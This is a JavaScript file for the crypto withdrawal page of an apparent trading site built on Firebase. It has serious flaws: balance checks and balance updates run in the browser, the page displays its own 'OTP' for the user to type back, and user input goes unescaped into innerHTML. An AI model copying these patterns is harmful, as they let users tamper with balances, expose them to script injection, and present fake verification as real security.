// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-analytics.js";
import {
  getAuth,
  onAuthStateChanged,
  signInWithEmailAndPassword,
} from "https://www.gstatic.com/firebasejs/11.6.0/firebase-auth.js";
import {
  getFirestore,
  getDoc,
  doc,
  updateDoc,
  setDoc,
  serverTimestamp,
} from "https://www.gstatic.com/firebasejs/11.6.0/firebase-firestore.js";

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyASg5UlPTgE0HH-iM3HRfeMSY2a2Noa3o4",
  authDomain: "iqtraders1.firebaseapp.com",
  projectId: "iqtraders1",
  storageBucket: "iqtraders1.firebasestorage.app",
  messagingSenderId: "538849101252",
  appId: "1:538849101252:web:ffbbd7906c267ce7231091",
  measurementId: "G-J7LYXPLFWF",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const auth = getAuth();
const db = getFirestore();

const form = document.getElementById("withdraw-form");
const amount = document.getElementById("amount");
const walletAddress = document.getElementById("walletAddress");
const withdrawalNetwork = document.getElementById("network");
const withdrawalCurrency = document.getElementById("currency");
const withdrawalPlatform = document.getElementById("platform");

// Helper: Show modal
function showModal(content, options = {}) {
  let modal = document.getElementById("custom-modal");
  if (!modal) {
    modal = document.createElement("div");
    modal.id = "custom-modal";
    modal.className =
      "fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50";
    document.body.appendChild(modal);
  }
  modal.innerHTML = `
    <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-md relative animate-fade-in">
      ${content}
    </div>
  `;
  modal.style.display = "flex";
  if (options.onClose) {
    modal.onclick = (e) => {
      if (e.target === modal) {
        modal.style.display = "none";
        options.onClose();
      }
    };
  }
}
function hideModal() {
  const modal = document.getElementById("custom-modal");
  if (modal) modal.style.display = "none";
}

// Helper: Preloader modal
function showPreloader(text = "Processing...") {
  showModal(`
    <div class="flex flex-col items-center">
      <svg class="animate-spin h-12 w-12 text-blue-500 mb-4" fill="none" viewBox="0 0 24 24">
        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"></path>
      </svg>
      <span class="text-blue-600 font-semibold">${text}</span>
    </div>
  `);
}

// Helper: Animate fade-in
const style = document.createElement("style");
style.innerHTML = `.animate-fade-in { animation: fadeIn 0.3s; } @keyframes fadeIn { from { opacity: 0; transform: scale(0.95);} to { opacity: 1; transform: scale(1);} }`;
document.head.appendChild(style);

// Regex patterns
const regexPatterns = {
  amount: /^\d+(\.\d{1,2})?$/, // number with up to 2 decimals
  walletAddress: /^[a-zA-Z0-9]{20,42}$/, // simple crypto address pattern
  network: /^[A-Za-z0-9\s\-]{3,20}$/,
  currency: /^[A-Z]{3,5}$/,
  platform: /^[A-Za-z0-9\s\-]{3,20}$/,
};

// Validate form fields
function validateFields() {
  if (!regexPatterns.amount.test(amount.value.trim())) {
    return { valid: false, message: "Invalid amount format." };
  }
  if (!regexPatterns.walletAddress.test(walletAddress.value.trim())) {
    return { valid: false, message: "Invalid wallet address." };
  }
  if (!regexPatterns.network.test(withdrawalNetwork.value.trim())) {
    return { valid: false, message: "Invalid network." };
  }
  if (!regexPatterns.currency.test(withdrawalCurrency.value.trim())) {
    return { valid: false, message: "Invalid currency." };
  }
  if (!regexPatterns.platform.test(withdrawalPlatform.value.trim())) {
    return { valid: false, message: "Invalid platform." };
  }
  return { valid: true };
}

// Fetch user balance from Firestore
async function fetchUserBalance(uid) {
  const userDoc = await getDoc(doc(db, "users", uid));
  if (userDoc.exists()) {
    return userDoc.data().Balance || 0;
  }
  throw new Error("User not found");
}

// Update user balance in Firestore
async function updateUserBalance(uid, newBalance) {
  await updateDoc(doc(db, "users", uid), { Balance: newBalance });
}

// Save withdrawal request to Firestore
async function saveWithdrawal(logId, uid, data) {
  await setDoc(doc(db, "withdrawals", logId), {
    ...data,
    uid,
    status: "pending",
    createdAt: serverTimestamp(),
  });
}

// Generate OTP
function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Main form submit handler
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  // 1. Validate fields
  const validation = validateFields();
  if (!validation.valid) {
    showModal(
      `<div class="text-red-600 font-semibold text-center">${validation.message}</div>`
    );
    setTimeout(hideModal, 2000);
    return;
  }

  // 2. Show preloader
  showPreloader();

  // 3. Check user balance
  onAuthStateChanged(auth, async (user) => {
    if (!user) {
      hideModal();
      showModal(
        `<div class="text-red-600 font-semibold text-center">User not authenticated.</div>`
      );
      setTimeout(hideModal, 2000);
      return;
    }
    try {
      // Fetch logId from localStorage
      const logId = localStorage.getItem("logId") || crypto.randomUUID();

      const balance = await fetchUserBalance(user.uid);
      const withdrawAmount = parseFloat(amount.value);

      if (withdrawAmount > balance) {
        hideModal();
        showModal(
          `<div class="text-red-600 font-semibold text-center">Insufficient balance.</div>`
        );
        setTimeout(hideModal, 2000);
        return;
      }

      // 4. Ask for email and password
      hideModal();
      showModal(`
        <form id="email-pass-form" class="flex flex-col gap-4">
          <div class="flex flex-col">
            <label class="font-semibold">Email</label>
            <input type="email" id="modal-email" class="border rounded px-2 py-1" required />
          </div>
          <div class="flex flex-col">
            <label class="font-semibold">Password</label>
            <input type="password" id="modal-password" class="border rounded px-2 py-1" required />
          </div>
          <button type="submit" class="bg-blue-600 text-white rounded py-2 font-bold hover:bg-blue-700 transition">Continue</button>
        </form>
      `);

      document.getElementById("email-pass-form").onsubmit = async (ev) => {
        ev.preventDefault();
        const emailInput = document.getElementById("modal-email").value.trim();
        const passInput = document
          .getElementById("modal-password")
          .value.trim();

        // Validate email and password
        if (emailInput !== user.email) {
          showModal(
            `<div class="text-red-600 font-semibold text-center">Email does not match.</div>`
          );
          setTimeout(hideModal, 2000);
          return;
        }
        // Re-authenticate user
        try {
          await signInWithEmailAndPassword(auth, emailInput, passInput);
        } catch (err) {
          showModal(
            `<div class="text-red-600 font-semibold text-center">Incorrect password.</div>`
          );
          setTimeout(hideModal, 2000);
          return;
        }

        // 5. OTP Modal
        const otp = generateOTP();
        hideModal();
        showModal(`
          <form id="otp-form" class="flex flex-col gap-4">
            <div class="flex flex-col items-center">
              <svg class="h-10 w-10 text-blue-500 mb-2" fill="none" viewBox="0 0 24 24">
                <path stroke="currentColor" stroke-width="2" d="M12 4v16m8-8H4"/>
              </svg>
              <span class="font-semibold text-lg">Enter this OTP:</span>
              <span class="text-2xl font-bold text-blue-600">${otp}</span>
            </div>
            <input type="text" id="modal-otp" class="border rounded px-2 py-1 text-center" maxlength="6" required />
            <button type="submit" class="bg-blue-600 text-white rounded py-2 font-bold hover:bg-blue-700 transition">Verify OTP</button>
          </form>
        `);

        document.getElementById("otp-form").onsubmit = async (ev2) => {
          ev2.preventDefault();
          const otpInput = document.getElementById("modal-otp").value.trim();
          if (otpInput !== otp) {
            showModal(
              `<div class="text-red-600 font-semibold text-center">Incorrect OTP.</div>`
            );
            setTimeout(hideModal, 2000);
            return;
          }

          // 6. Preloader for 3 seconds
          showPreloader("Processing transaction...");
          setTimeout(async () => {
            // 7. Update balance and save withdrawal
            try {
              const newBalance = balance - withdrawAmount;
              await updateUserBalance(user.uid, newBalance);

              await saveWithdrawal(logId, user.uid, {
                amount: withdrawAmount,
                walletAddress: walletAddress.value.trim(),
                network: withdrawalNetwork.value.trim(),
                currency: withdrawalCurrency.value.trim(),
                platform: withdrawalPlatform.value.trim(),
              });

              hideModal();

              // 8. Transaction pending modal
              showModal(`
                <div class="flex flex-col items-center gap-4">
                  <svg class="h-12 w-12 text-yellow-500 animate-spin mb-2" fill="none" viewBox="0 0 24 24">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"></path>
                  </svg>
                  <div class="text-center">
                    <h2 class="text-xl font-bold text-yellow-600 mb-2">Transaction Pending</h2>
                    <p class="mb-2">Your withdrawal is being processed and is awaiting admin approval (within 24 hours).</p>
                    <div class="bg-gray-100 rounded p-3 text-left text-sm">
                      <div><span class="font-semibold">Amount:</span> $${amount.value}</div>
                      <div><span class="font-semibold">Wallet Address:</span> ${walletAddress.value}</div>
                      <div><span class="font-semibold">Network:</span> ${withdrawalNetwork.value}</div>
                      <div><span class="font-semibold">Currency:</span> ${withdrawalCurrency.value}</div>
                      <div><span class="font-semibold">Platform:</span> ${withdrawalPlatform.value}</div>
                    </div>
                  </div>
                  <div class="icon-wrapper">
                      <div class="text-wrapper text-center">
                          <p>Withdrawal still Processing?</p>
                          <p>Contact our support team at 
                            <p class="text admin-icon">
                              <a
                                href="https://t.me/Trader_Martinezan01 "
                                target="_blank"
                              >
                                <i class="fa-brands fa-telegram"></i>
                              </a>
                              <a href="https://wa.link/tkkvm1" target="_blank">
                                <i class="fa-brands fa-whatsapp"></i>
                              </a>
                            </p>
                          </p>
                      </div>
                    </div>
                  <button id="close-pending" class="mt-2 bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">Close</button>
                </div>
              `);
              document
                .getElementById("close-pending")
                .addEventListener("click", () => {
                  window.location.href = "/user/index.html";
                });

              // Your provided code for withdrawBtn
              const withdrawBtn = document.getElementById("withdrawBtn");
              const popMessage = document.getElementById("popMessage");
              if (withdrawBtn && popMessage) {
                withdrawBtn.addEventListener("click", () => {
                  popMessage.style.display = "flex";
                  popMessage.innerHTML = `
                  <div class="relative animation-container-p ">
                  <div class="cancel-sign-btn" id="cancel-sign-btn"><span>&#10005;</span></div>
                    <div class="icon-wrapper">
                      <svg class="notification-icon" viewBox="0 0 52 52">
                        <path d="M26 6.3a19.5 19.5 0 0 1 13.8 33.2c.1 2.3-1.9 4-4.1 4H16.3c-2.2 0-4.2-1.7-4.1-4a19.5 19.5 0 0 1 13.8-33.2z"/>
                          <path d="M26 17.5v10.5"/>
                          <path d="M26 39.5a3.5 3.5 0 1 1 0-7 3.5 3.5 0 0 1 0 7z"/>
                      </svg>
                      <div class="text-wrapper text-center">
                          <p>Withdrawal still Processing?</p>
                          <p>Contact our support team at 
                            <p class="text admin-icon">
                              <a
                                href="https://t.me/Trader_Martinezan01 "
                                target="_blank"
                              >
                                <i class="fa-brands fa-telegram"></i>
                              </a>
                              <a href="https://wa.link/tkkvm1" target="_blank">
                                <i class="fa-brands fa-whatsapp"></i>
                              </a>
                            </p>
                          </p>
                      </div>
                    </div>
                  </div>
                `;
                  const cancelBtn = document.getElementById("cancel-sign-btn");
                  if (cancelBtn)
                    cancelBtn.onclick = () => {
                      popMessage.style.display = "none";
                    };
                });
              }
            } catch (err) {
              hideModal();
              showModal(
                `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
              );
              setTimeout(hideModal, 2000);
            }
          }, 3000);
        };
      };
    } catch (err) {
      hideModal();
      showModal(
        `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
      );
      setTimeout(hideModal, 2000);
    }
  });
});
